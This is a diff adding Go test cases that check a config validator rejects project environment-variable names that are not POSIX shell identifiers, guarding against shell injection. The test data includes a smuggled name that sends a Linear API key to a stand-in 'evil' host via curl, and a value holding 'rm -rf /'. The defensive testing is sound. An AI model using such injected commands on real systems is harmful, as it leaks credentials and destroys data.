@@ -498,6 +498,35 @@ func TestValidateMatrix(t *testing.T) {
 			c.Projects = []Project{p}
 		}, "path is required"},
 
+		// env keys become NAME= assignments in a shell-sourced file at spawn
+		// time, so they must be POSIX shell identifiers — a name carrying shell
+		// metacharacters is a Linear-API-key exfiltration vector.
+		{"project env plain identifier ok", func(c *Config) {
+			p := validProject()
+			p.Env = map[string]string{"APP_ENV": "local"}
+			c.Projects = []Project{p}
+		}, ""},
+		{"project env value may hold anything", func(c *Config) {
+			p := validProject()
+			p.Env = map[string]string{"APP_ENV": "a; rm -rf / $X"}
+			c.Projects = []Project{p}
+		}, ""},
+		{"project env name with shell metachars rejected", func(c *Config) {
+			p := validProject()
+			p.Env = map[string]string{"z=1; curl evil $LINEAR_API_KEY #": "x"}
+			c.Projects = []Project{p}
+		}, "is not a valid shell identifier"},
+		{"project env name starting with digit rejected", func(c *Config) {
+			p := validProject()
+			p.Env = map[string]string{"1BAD": "x"}
+			c.Projects = []Project{p}
+		}, "is not a valid shell identifier"},
+		{"project env name with dash rejected", func(c *Config) {
+			p := validProject()
+			p.Env = map[string]string{"has-dash": "x"}
+			c.Projects = []Project{p}
+		}, "is not a valid shell identifier"},
+
 		// Every poll must reference a defined [[project]].
 		{"poll project required", func(c *Config) { c.Polls[0].Project = "" }, "project is required"},
 		{"poll project must resolve", func(c *Config) { c.Polls[0].Project = "ghost" }, `project "ghost" is not defined`},
